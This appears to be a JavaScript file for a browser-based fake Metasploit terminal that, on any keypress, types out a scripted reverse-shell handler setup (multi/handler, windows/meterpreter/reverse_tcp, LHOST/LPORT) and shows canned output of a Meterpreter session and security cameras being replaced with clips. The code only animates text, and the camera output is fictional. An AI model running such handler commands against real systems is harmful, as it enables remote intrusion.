const terminal = document.querySelector('.terminal');
const terminalBody = document.querySelector('.terminal-body');

const output = document.querySelector('.output');

const users = {}; 

let history = [];
let historyIndex = 0;

let currentUser = null;

const asciiBanner =
"   _____          __                        .__         .__  __   \n" +
"  /     \   _____/  |______    ____________ |  |   ____ |__|/  |_ \n" +
" /  \\ /  \\_/ __ \\   __\\__  \\  /  ___/\\____ \\|  |  /  _ \\|  \\   __\\\n" +
"/    Y    \\  ___/|  |  / __ \\_\\___ \\ |  |_> >  |_(  <_> )  ||  |  \n" +
"\\____|__  /\\___  >__| (____  /____  >|   __/|____/\\____/|__||__|  \n" +
"        \\/     \\/          \\/     \\/ |__|                         ";

const initialMessage = `<pre>${asciiBanner}</pre><p>Frustrated with proxy pivoting? Upgrade to layer-2 VPN pivoting with<br />learn more on http://rapid7.com/metasploit
Metasploit Pro</p>`;

const metasploitDetails = `&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=[ metasploit v4.14.22-dev]<br />
+ -- + --=[ 1658 exploits 947 auxiliary 293 post]<br />
+ -- + --=[ 486 payloads - - 40 encoders - 9 nops]<br />
+ -- + --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]<br />
<br /><br />`;

const commandList = [
    {input: 'use exploit/multi/handler', output: null},
    {input: 'set payload windows/meterpreter/reverse_tcp', output: ['payload => windows/meterpreter/reverse_tcp']},
    {input: 'set LPORT 4444', output: ['LPORT => 4444']},
    {input: 'set LHOST 192.168.225.12', output: ['LHOST => 192.168.225.12']},
    {
        input: 'exploit', 
        output: [
            `[*] Started reverse TCP handler on 192.168.225.12:4444`,
            `[*] Starting the payload handler...`,
            `[*] Starting the payload handler...`,
            `[*] Sending stage (957487 bytes) to 192.168.225.14`,
            `[*] Meterpreter session 1 opened (192.168.225.12:4444-> 192.168.225.14:53595) at 2017-06- 23 12:05:55 +0100`,
            `[*] Camera 1 replaced with clip: 003213244.mkv`,
            `[*] Camera 2 replaced with clip: 003213245.mkv`,
            `[*] Camera 3 replaced with clip: 003213246.mkv`,
            `[*] Camera 4 replaced with clip: 003213247.mkv`,
        ]
    },
];

var activeInputIndex = 0;

output.innerHTML = initialMessage;

setTimeout(() => {
    output.innerHTML = initialMessage + metasploitDetails;
}, 1000)

function displayPrompt() {
    const inputLine = document.querySelector('.input-line');
    inputLine.innerHTML = `<span class="prompt">msf>&nbsp;</span><input type="text" class="command-line" autofocus>`;
    const commandLine = inputLine.querySelector('.command-line');

    commandLine.addEventListener('keypress', (e) => {
        let t = 0;
        function typeWriter(txt) {
            if (t < txt.length) {
                document.querySelector(".command.current").innerHTML += txt.charAt(t);
                t++;
                setTimeout(() => typeWriter(txt), 150);
            }
        }
        if (e.key && activeInputIndex < commandList.length) {
            const command = commandList[activeInputIndex];
            inputLine.style.display = 'none';
            appendOutput(`<p><span class="prompt">msf>&nbsp;</span><span class="command current">${''}</span></p>`); 
            typeWriter(command.input)
            setTimeout(() => {
                executeCommand();
            }, (command.input.length * 150) + 200);
            setTimeout(() => {
                inputLine.style.display = 'block';
                document.querySelector(".command.current").classList.remove('current')
                displayPrompt();
                activeInputIndex++;
            }, ((command?.output?.length ?? 0) * 1000) + (command.input.length * 150) + 200);
        }
    });

    commandLine.focus();                            
}

function appendOutput(content) {
    const newOutput = document.createElement('div');
    newOutput.innerHTML = `<p>${content}</p>`;
    output.appendChild(newOutput);
}

function executeCommand() {
    const command = commandList[activeInputIndex];
    let i = 0;

    if (command.output && command.output.length > 0) {
        while (i < command.output.length) {
            let message = command?.output[i];
            setTimeout(() => {
                appendOutput(message);
                terminalBody.scrollTo({
                    top: terminalBody.scrollHeight,
                    behavior: 'smooth',
                });
            }, (i + 1) * 1000);
            i++;
        }
    } else {
        return;
    }
}

setTimeout(() => {
    displayPrompt();
}, 2000)


